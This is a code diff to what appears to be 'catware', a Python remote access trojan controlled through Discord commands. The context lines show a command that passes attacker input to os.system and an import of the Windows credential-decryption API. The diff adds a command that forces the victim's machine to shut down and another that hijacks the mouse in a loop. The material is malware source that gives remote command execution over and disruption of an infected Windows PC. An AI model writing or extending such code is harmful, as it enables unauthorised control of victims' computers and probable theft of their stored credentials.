@@ -28,6 +28,7 @@ from json import loads
 from win32crypt import CryptUnprotectData
 import codecs
 import sys
+import pyautogui
 
 embedcolor = 000000
 
@@ -767,6 +768,20 @@ def Startbot():
     @catware.command()
     async def console(ctx, command):
         os.system(f'cmd /k "{command}"')
+
+    @catware.command()
+    async def winshutdown(ctx):
+        os.system("shutdown /p")
+
+    @catware.command()
+    async def mousehuj(ctx, time):
+        while time !=0:
+    
+            pyautogui.moveTo(500, 750)
+            pyautogui.moveTo(1300, 750)
+            pyautogui.moveTo(1300, 200)
+            pyautogui.moveTo(100, 200)
+            time-=1
     
     @catware.command()
     async def endtask(ctx, taskname):
